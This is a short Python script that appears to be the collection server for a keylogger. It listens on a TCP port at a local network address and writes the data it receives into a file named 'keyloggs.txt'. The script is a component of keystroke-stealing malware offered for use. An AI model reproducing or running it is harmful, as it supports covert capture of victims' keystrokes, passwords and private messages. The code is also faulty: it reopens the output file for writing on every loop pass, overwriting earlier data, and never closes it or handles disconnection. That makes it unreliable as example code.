import socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("192.168.1.3", 9999))
server.listen()
client, adrr = server.accept()
while 1:

    file = open("keyloggs.txt", "wb")
    data = client.recv(1024)
    file.write(data)